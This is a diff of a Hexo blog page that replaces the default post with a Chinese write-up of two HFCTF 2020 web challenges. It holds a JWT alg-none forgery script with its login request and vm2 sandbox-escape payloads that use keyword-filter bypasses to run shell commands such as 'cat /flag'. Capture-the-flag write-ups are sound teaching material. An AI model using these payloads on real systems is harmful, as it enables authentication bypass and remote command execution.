@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, M0on&#39;s Blog">
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex">
+    <meta name="keywords" content="hfctf2020部分writeup, M0on&#39;s Blog">
+    <meta name="description" content="太菜了">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Hello World | M0on&#39;s Blog</title>
+    <title>hfctf2020部分writeup | M0on&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -219,12 +219,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/31.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">hfctf2020部分writeup</h1>
                 </div>
             </div>
         </div>
@@ -339,12 +339,29 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                            <a href="/tags/writeup/">
+                                <span class="chip bg-color">writeup</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web/" class="post-category">
+                                web
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -353,7 +370,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-10
+                    2020-04-19
                 </div>
                 
 
@@ -362,14 +379,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    683
+                    745
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -385,46 +402,174 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-<p>##写文章</p>
-<pre><code>---
-title: typora-vue-theme主题介绍
-date: 2018-09-07 09:25:00
-author: 赵奇
-img: /source/images/xxx.jpg
-top: true
-cover: true
-coverImg: /images/1.jpg
-password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
-toc: false
-mathjax: false
-summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要
-categories: Markdown
-tags:
-  - Typora
-  - Markdown
----
-</code></pre><pre class=" language-$xslt"><code class="language-$xslt">title    Markdown 的文件标题    文章标题，强烈建议填写此选项
-date    文件创建时的日期时间    发布时间，强烈建议填写此选项，且最好保证全局唯一
-author    根 _config.yml 中的 author    文章作者
-img    featureImages 中的某个值    文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpg
-top    true    推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章
-cover    false    v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中
-coverImg    无    v1.0.2版本新增，表示该文章在首页轮播封面需**要显示的图片路径，如果没有，则默认使用文章的特色图片
-password    无    文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项
-toc    true    是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项
-mathjax    false    是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行
-summary    无    文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要
-categories    无    文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类
-tags    无    文章标签，一篇文章可以多个标签</code></pre>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>都是知道的知识点，但是总是觉得是自己不会的知识点，</p>
+<p>看都没怎么看就疯狂谷歌，被外国比赛打出阴影了。</p>
+<p>外国比赛基本都是不会的知识点</p>
+<h2 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h2><p>node的题目,扫描看到<code>package.json</code>和<code>app.js</code></p>
+<p>根据<code>require</code>的情况看代码</p>
+<p>api的代码<code>controllers/api.js</code></p>
+<pre><code>const crypto = require('crypto');
+const fs = require('fs')
+const jwt = require('jsonwebtoken')
+
+const APIError = require('../rest').APIError;
+
+module.exports = {
+    'POST /api/register': async (ctx, next) =&gt; {
+        const {username, password} = ctx.request.body;
+
+        if(!username || username === 'admin'){
+            throw new APIError('register error', 'wrong username');
+        }
+
+        if(global.secrets.length &gt; 100000) {
+            global.secrets = [];
+        }
+
+        const secret = crypto.randomBytes(18).toString('hex');
+        const secretid = global.secrets.length;
+        global.secrets.push(secret)
+
+        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});
+
+        ctx.rest({
+            token: token
+        });
+
+        await next();
+    },
+
+    'POST /api/login': async (ctx, next) =&gt; {
+        const {username, password} = ctx.request.body;
+
+        if(!username || !password) {
+            throw new APIError('login error', 'username or password is necessary');
+        }
+
+        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
+
+        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;
+
+        console.log(sid)
+
+        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
+            throw new APIError('login error', 'no such secret id');
+        }
+
+        const secret = global.secrets[sid];
+
+        const user = jwt.verify(token, secret, {algorithm: 'HS256'});
+
+        const status = username === user.username &amp;&amp; password === user.password;
+
+        if(status) {
+            ctx.session.username = username;
+        }
+
+        ctx.rest({
+            status
+        });
+
+        await next();
+    },
+
+    'GET /api/flag': async (ctx, next) =&gt; {
+        if(ctx.session.username !== 'admin'){
+            throw new APIError('permission error', 'permission denied');
+        }
+
+        const flag = fs.readFileSync('/flag').toString();
+        ctx.rest({
+            flag
+        });
+
+        await next();
+    },
+
+    'GET /api/logout': async (ctx, next) =&gt; {
+        ctx.session.username = null;
+        ctx.rest({
+            status: true
+        })
+        await next();
+    }
+};
+</code></pre><p>关键是</p>
+<pre><code> const secret = global.secrets[sid];
+
+        const user = jwt.verify(token, secret, {algorithm: 'HS256'});
+
+        const status = username === user.username &amp;&amp; password === user.password;</code></pre><p>这里用了 <code>jsonwebtoken</code></p>
+<p><code>evoa</code>师傅在<code>unctf</code> 出了题目，是关于<code>jsonwebtoken</code>的缺陷的</p>
+<p>使<code>secretid</code>是不存在的，然后伪造</p>
+<pre><code>import jwt
+token = jwt.encode({"secretid":"","username":"admin","password":"admin","iat":1587324787},algorithm="none",key="").decode(encoding='utf-8')
+print(token)
+
+#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IiIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3MzI0Nzg3fQ.</code></pre><p>然后post</p>
+<pre><code>POST /api/login HTTP/1.1
+
+username=admin&amp;password=admin&amp;authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IiIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3MzI0Nzg3fQ.</code></pre><p>登录获取<code>cookie</code></p>
+<p>带上这两个<code>cookie</code>然后访问<code>/api/flag</code>获取flag</p>
+<h2 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h2><p>看起来是<code>php</code>，实际上是<code>node</code>，</p>
+<p>在<code>run.php?code=1-1</code> 可以执行代码</p>
+<p>一看名字叫<code>escape</code>就知道又是<code>vm2</code>逃逸了</p>
+<p>过滤了一些东西大概是</p>
+<pre><code>'
+"
++
+process
+exec
+constructor
+for</code></pre><p>这个可以绕过</p>
+<p>用这个方式</p>
+<pre><code>try { require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`) } catch(e){}</code></pre><p>那么只要找<code>issues</code>就可以了</p>
+<p>最新的不行逃逸，卡了很多时间，无语了</p>
+<p><a href="https://github.com/patriksimek/vm2/issues/268" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/268</a></p>
+<p>用历史的，<code>2019</code>的可以了</p>
+<p><a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a></p>
+<pre><code>import requests
+
+
+
+a='''(function(){
+    try { require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`) } catch(e){}
+
+    let buffer = {
+        hexSlice: () =&gt; ``,
+        magic: {
+            get [Symbol[`f\\u006fr`](`n\\u006fdejs.util.inspect.cust\\u006fm`)](){
+                throw f =&gt; f[`c\\u006fnstruct\\u006fr`](`return pr\\u006fcess`)();
+            }
+        }
+    };
+    try{
+        Buffer[`pr\\u006ftotype`][`inspect`][`call`](buffer, 0, { customInspect: true });
+    }catch(e){
+        e(()=&gt;0).mainModule.require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`)
+    }
+})()'''
+
+
+
+
+
+
+a='''(function(){
+    TypeError[`prot\\u006ftype`][`get_pr\\u006fcess`] = f=&gt;f[`c\\u006fnstructor`](`return pr\\u006fcess`)();
+    try{
+        Object.preventExtensions(Buffer.from(``)).a = 1;
+    }catch(e){
+        return e[`get_pr\\u006fcess`](()=&gt;{}).mainModule[`require`](`child_pr\\u006fcess`)[`\\u0065xecSync`](`cat /flag`).toString();
+    }
+})()'''
+
+
+
+url='http://ca8b55804ed648d3a6e6bad8e66e5f6fd0e8b9cfec904ad7.changame.ichunqiu.com/run.php'
+param={'code':a}
+req=requests.get(url=url,params=param)
+print(req.text)</code></pre><p>打不过打不过，明天去<code>Ha1cyonCTF</code>玩了</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -468,7 +613,7 @@ tags    无    文章标签，一篇文章可以多个标签</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://mo0n.top/2020/02/10/hello-world/">http://mo0n.top/2020/02/10/hello-world/</a>
+                    <a href="http://mo0n.top/2020/04/19/hfctf2020-bu-fen-writeup/">http://mo0n.top/2020/04/19/hfctf2020-bu-fen-writeup/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -505,7 +650,15 @@ tags    无    文章标签，一篇文章可以多个标签</code></pre>
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                                <a href="/tags/writeup/">
+                                    <span class="chip bg-color">writeup</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -544,29 +697,84 @@ tags    无    文章标签，一篇文章可以多个标签</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/02/14/sqlite/">
+                <a href="/2020/04/19/hfctf2020-bu-fen-writeup/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="sqlite">
+                        <img src="/medias/featureimages/31.jpg" class="responsive-img" alt="hfctf2020部分writeup">
                         
-                        <span class="card-title">sqlite</span>
+                        <span class="card-title">hfctf2020部分writeup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            不忘初心
+                            太菜了
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-14
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web/" class="post-category">
+                                    web
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/writeup/">
+                        <span class="chip bg-color">writeup</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/04/18/wpictf2020-bu-fen-writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/30.jpg" class="responsive-img" alt="WPICTF-2020-部分writeup">
+                        
+                        <span class="card-title">WPICTF-2020-部分writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            虎符前一天看一下
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -586,49 +794,11 @@ tags    无    文章标签，一篇文章可以多个标签</code></pre>
                         <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/sql/">
-                        <span class="chip bg-color">sql</span>
+                    <a href="/tags/writeup/">
+                        <span class="chip bg-color">writeup</span>
                     </a>
                     
                 </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/02/10/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-10
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            m0on
-                            
-                        </span>
-                    </div>
-                </div>
-
                 
             </div>
         </div>
